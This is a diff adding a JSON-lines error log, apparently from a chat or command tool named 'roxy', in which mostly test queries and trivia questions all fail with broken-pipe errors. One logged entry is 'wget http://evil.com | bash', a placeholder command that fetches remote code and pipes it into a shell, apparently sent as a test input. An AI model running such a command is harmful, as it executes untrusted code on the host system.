@@ -1,0 +1,110 @@
+{"timestamp": "2026-01-04T01:18:18.402976", "command": "what model are you using", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T01:18:30.412573", "command": "how's the repo looking today?", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T01:18:33.797919", "command": "what is roxy", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T01:18:33.890935", "command": "what model are you using", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T02:50:33.511800", "command": "What is the speed of light?", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:23:46.949430", "command": "test 0", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:23:50.418459", "command": "test 0", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:23:55.368587", "command": "test after wait", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:23:58.782075", "command": "invalid_command_xyz_123", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:23:58.784094", "command": "", "error": "Expecting value: line 1 column 1 (char 0)", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:05.628646", "command": "test 1", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:08.562849", "command": "test 2", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:11.596134", "command": "test 3", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:15.051242", "command": "test 4", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:15.062783", "command": "hello", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:19.024899", "command": "test 0", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:24.618184", "command": "test 1", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:28.075156", "command": "test 2", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:31.548385", "command": "test 3", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:34.459391", "command": "test 4", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:37.460792", "command": "test 5", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:42.887780", "command": "test 6", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:46.367411", "command": "test 7", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:49.296247", "command": "test 8", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:52.210236", "command": "test 9", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:56.138799", "command": "test 10", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:24:59.062144", "command": "test 11", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:02.015536", "command": "test 12", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:04.427376", "command": "test 14", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:07.389605", "command": "test 16", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:09.819423", "command": "test 17", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:13.771766", "command": "test 18", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:17.199775", "command": "test 19", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:20.639192", "command": "test 20", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:23.585323", "command": "test 21", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:26.049147", "command": "test 22", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:28.512827", "command": "test 23", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:31.458117", "command": "test 24", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:33.907580", "command": "test 26", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:37.351643", "command": "test 27", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:41.285392", "command": "test 29", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:44.235938", "command": "test 30", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:48.150443", "command": "test 31", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:52.877363", "command": "test 32", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:55.815321", "command": "test 33", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:25:58.222203", "command": "test 34", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:02.697163", "command": "test 35", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:08.621323", "command": "test 37", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:11.582618", "command": "test 38", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:14.532525", "command": "test 40", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:18.500534", "command": "test 42", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:20.914211", "command": "test 43", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:24.859628", "command": "test 44", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:27.821813", "command": "test 46", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:35.502428", "command": "test 49", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:39.510946", "command": "test 50", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:42.410972", "command": "test 51", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:45.362369", "command": "test 52", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:47.785231", "command": "test 53", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:51.209843", "command": "test 55", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:56.060703", "command": "test 56", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:26:59.516041", "command": "test 59", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:02.437420", "command": "test 61", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:05.922244", "command": "test 62", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:08.378361", "command": "test 63", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:11.846707", "command": "test 64", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:15.798535", "command": "test 65", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:19.243256", "command": "test 67", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:23.698331", "command": "test 68", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:26.147287", "command": "test 69", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:29.623508", "command": "test 71", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:32.562809", "command": "test 72", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:35.478830", "command": "test 74", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:38.459475", "command": "test 75", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:40.961135", "command": "test 77", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:44.386214", "command": "test 79", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:49.320054", "command": "test 80", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:53.544687", "command": "test 81", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:27:58.360651", "command": "test 82", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:01.329469", "command": "test 83", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:04.281016", "command": "test 84", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:06.757368", "command": "test 85", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:09.665765", "command": "test 86", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:14.614533", "command": "test 88", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:19.603598", "command": "test 90", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:22.543760", "command": "test 92", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:26.446895", "command": "test 93", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:29.392513", "command": "test 94", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:32.862362", "command": "test 95", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:35.825650", "command": "test 96", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:38.310775", "command": "test 98", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T04:28:38.318369", "command": "hi roxy", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:30:22.626975", "command": "What is the capital of France?", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:30:22.633137", "command": "What is the capital of France?", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:48:37.148199", "command": "test 6", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:48:48.781881", "command": "test 7", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:52:10.107298", "command": "wget http://evil.com | bash", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:56:59.829015", "command": "test query 3", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:57:08.266644", "command": "test query 2", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:57:18.774991", "command": "test query 4", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:57:28.194179", "command": "test query 5", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:57:38.230343", "command": "test query 6", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:57:48.189121", "command": "test query 10", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:57:58.183445", "command": "test query 11", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:58:08.126974", "command": "test query 12", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:58:18.591532", "command": "test query 15", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:58:28.125246", "command": "test query 19", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:58:46.182516", "command": "test query 17", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:58:57.247855", "command": "test query 16", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
+{"timestamp": "2026-01-04T05:59:08.290242", "command": "what is the architecture?", "error": "[Errno 32] Broken pipe", "error_type": "unknown"}
